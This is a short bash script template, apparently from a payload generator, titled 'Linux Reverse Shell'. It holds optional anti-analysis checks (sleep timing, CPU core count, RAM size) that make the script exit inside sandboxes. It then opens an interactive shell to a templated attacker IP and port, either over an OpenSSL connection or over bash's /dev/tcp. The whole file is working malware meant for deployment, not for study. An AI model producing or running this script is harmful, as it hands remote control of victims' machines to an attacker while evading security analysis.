#!/bin/bash
# Linux Reverse Shell {{ " (SSL)" if ssl else "" }}
{% if anti_analysis %}
# Anti-Analysis
# 1. Sleep Check
now=$(date +%s)
sleep 10
end=$(date +%s)
diff=$((end - now))
if [ $diff -lt 10 ]; then exit; fi

# 2. Cores Check
cores=$(nproc)
if [ $cores -lt 2 ]; then exit; fi

# 3. RAM Check (>4GB)
mem=$(grep MemTotal /proc/meminfo | awk '{print $2}')
if [ $mem -lt 4000000 ]; then exit; fi
{% endif %}

{% if ssl %}
if command -v openssl >/dev/null 2>&1; then
    mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {{ ip }}:{{ port }} > /tmp/s; rm /tmp/s
else
    # Fallback to plain TCP if OpenSSL missing
    bash -i >& /dev/tcp/{{ ip }}/{{ port }} 0>&1
fi
{% else %}
bash -i >& /dev/tcp/{{ ip }}/{{ port }} 0>&1
{% endif %}
